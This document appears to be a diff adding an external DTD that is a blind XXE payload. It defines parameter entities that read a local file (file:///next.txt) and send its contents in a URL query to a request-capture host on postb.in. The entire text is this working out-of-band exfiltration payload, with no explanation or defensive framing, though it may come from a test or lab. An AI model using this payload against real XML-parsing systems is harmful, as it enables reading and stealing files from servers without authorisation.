@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///next.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://www.postb.in/1784676233992-6357185347005?d=%file;'>">
+%eval;
+%exfil;
